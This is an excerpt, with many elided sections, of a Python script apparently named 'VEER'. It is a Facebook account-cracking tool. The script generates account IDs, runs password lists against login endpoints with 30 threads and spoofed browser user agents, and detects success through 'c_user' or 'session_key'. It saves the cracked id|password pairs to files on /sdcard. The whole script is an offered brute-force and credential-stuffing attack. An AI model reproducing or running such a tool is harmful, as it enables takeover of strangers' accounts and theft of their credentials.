...
for xd in range(10000):
        ...
        c=f' TL-tl; {str(gt)}'
        g='AppleWebKit/537.36 (KHTML, like Gecko) Silk/110.6.7 like Chrome/110.0.5481.212 Safari/537.36'
...
___________________Veeru___________________
 Author    : EMRAAN HASHMI FAN 
 Github    : VEER
 Facebook  : VEER ALI
 Tool Name : VEER
 Type type : Free
 Version   : 0.5
_______________Veer________________
 VEERU PRO version 0.5
 For Haters: All friends duaoun me yad rakhna 🤞
\033[1;37m______________veeru_______""")
def linex():
        print('\033[1;37m___________Veeru________')
def clear():
        os.system('clear')
        print(logo)
loop=0
...
def public():
        ...
        try:
                ...
                with tred(max_workers=30) as crack_submit:
                        ...
                        print("\033[1;37m \x1b[38;5;208mUse jhaaz mode for speed up\033[1;37m")
                        linex()
                        for user in id:
...
def bd():
                ...
                with tred(max_workers=30) as Aking:     
                        ...
                        print(' Total account : \033[1;32m'+tl)
                        print(f'\033[1;37m Choice code ..:\033[1;32m '+code)
                        print(f'\033[1;37m \x1b[38;5;208mUse jhaaz mode for speed up\033[1;97m')
                        linex()
                        for psx in user:
                                ids = code+psx
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [VEER-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Aking:
                                ...
                                print('\r\r\033[1;32m [VEER-OK] %s | %s'%(ids,pas))
...
def api(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [VEER-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/VEER-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        ...
                        for pw in passlist:
                                ...
                                if 'session_key' in q:
                                        ...
                                        if 'y' in pcp:
                                                ...
                                                open('/sdcard/AlVEER-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                else:
                                        continue
                        loop+=1
